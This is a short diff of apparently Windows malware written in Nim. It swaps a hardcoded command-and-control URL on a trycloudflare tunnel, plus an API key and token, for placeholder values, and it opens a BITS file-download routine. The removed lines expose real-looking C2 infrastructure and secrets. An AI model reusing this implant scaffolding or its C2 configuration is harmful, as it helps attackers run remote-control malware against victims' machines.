@@ -3,9 +3,9 @@ import winim/lean
 import winim/com
 import std/[strutils, random, os, times]
 
-proc getC2(): string = "https://geometry-offered-guns-replies.trycloudflare.com"
-proc getApiKey(): string = "051dfe1cf5e570846315512a11396f7d"
-proc getToken(): string = "8ca60eebbe9a141869305ed9ab1a0050"
+proc getC2(): string = "https://CHANGE-MECHANGE-ME.trycloudflare.com"
+proc getApiKey(): string = "00000000000000000000000000000000"
+proc getToken(): string = "00000000000000000000000000000000"
 
 proc bitsDownload(url, dest: string): bool =
   result = false
